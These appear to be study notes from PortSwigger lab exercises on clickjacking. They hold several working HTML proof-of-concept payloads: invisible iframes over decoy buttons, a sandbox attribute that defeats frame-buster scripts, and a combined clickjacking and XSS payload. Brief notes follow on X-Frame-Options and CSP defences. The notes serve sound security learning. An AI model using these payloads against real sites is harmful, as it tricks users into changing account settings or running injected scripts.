# Web application security

- [Source](portswigger.net)

## Clickjacking

- UI based attack, user doesn't see the actual button/link they are clikcing on. Can be a full website hidden from the user embedded inside an iframe

- Differs from a CSRF attack, request not forged without user knowledge

- Use CSS to obscure something and let user click the button

- basic clickjacking

```html

  <style>
   iframe {
       position:relative;
       width: 700px;
       height: 500px;
       opacity: 0.00001;
       z-index: 2;
   }
   div {
       position:absolute;
       top: 300px;
       left: 60px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://ace71f3e1e0583a180134485008600bf.web-security-academy.net/account"></iframe>
```

- Clickjacking when url param based form filling is allowed, ie, a GET is done and then a POST action on user interaction

```html
<style>
iframe {
 position: relative;
 width: 700px;
 height: 500px;
 opacity: 0.1;
 z-index: 2;
}

div {
 position:absolute;
 top: 425px;
 left: 80px;
 z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://acb01f191e41fd11802a0456009600e7.web-security-academy.net/email?email=hacker@attacker-website.com"></iframe>
 ```

- Clickjacking is posible when websites can be framed, ie iframe
- Frame busting sciprts are employed by browsers to make sure not websites are embedded in another website are not invisible and make them unclickable
  - check and enforce that the current application window is the main or top window,
  - make all frames visible,
  - prevent clicking on invisible frames
  - intercept and flag potential clickjacking attacks to the user
- To workaround this, iframe `sandbox` attr can be set `allow-forms` or `allow-scripts` values and the `allow-top-navigation` value is omitted then the frame buster script can be neutralized as the iframe cannot check whether or not it is the top window

```<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>```

- Both the allow-forms and allow-scripts values permit the specified actions within the iframe but top-level navigation is disabled. This inhibits frame busting behaviors while allowing functionality within the targeted site

- Clickjacking when browser/website is implementing a frame buster

```html
<style>
iframe {
 position: relative;
 width: 700px;
 height: 500px;
 opacity: 0.0001;
 z-index: 2;
}

div {
 position:absolute;
 top: 400px;
 left: 80px;
 z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://ac501f021f1c595680911ada00400048.web-security-academy.net/email?email=hacker@attacker-website.com"
sandbox="allow-forms"></iframe>
```

- clickjacking and XSS attack

```html
<style>
iframe {
 position: relative;
 width: 700px;
 height: 500px;
 opacity: 0.0001;
 z-index: 2;
}

div {
 position:absolute;
 top: 400px;
 left: 80px;
 z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://ac501f021f1c595680911ada00400048.web-security-academy.net/feedback??name=<img src=1 onerror=alert(1)>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

- Clickjacking, multistep

```html
<style>
   iframe {
       position:relative;
       width:700px;
       height: 500px;
       opacity: 0.1;
       z-index: 2;
   }
   .firstClick, .secondClick {
       position:absolute;
       top:275px;
       left:50px;
       z-index: 1;
   }
   .secondClick {
       left:200px;
   }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://acd31f6b1eacfdd2804c14f80087006c.web-security-academy.net/account"></iframe>
```

## Prevention

### X-Frame-Options

- Provides website owner control over use of iframes/objects
  - X-Frame_Options: deny -- No ifrmaes
  - X-Frame_Options: sameorigin -- Only from same origin
  - X-Frame_Options: allow-from `url or domain allowed to be framed`

- Returned from server

### Content Security Policy (CSP)

- A detection and prevention mechanism applied at the web server level, returned as a header `Content-Security-Policy: _string of policy directives_`
  - Content-Security-Policy: frame-ancestors 'none'; (X-Frame_Options: deny)
  - Content-Security-Policy: frame-ancestors 'self'; (X-Frame_Options: sameorigin)
  - Content-Security-Policy: frame-ancestors `websiteAddress/domain`; (allow from)
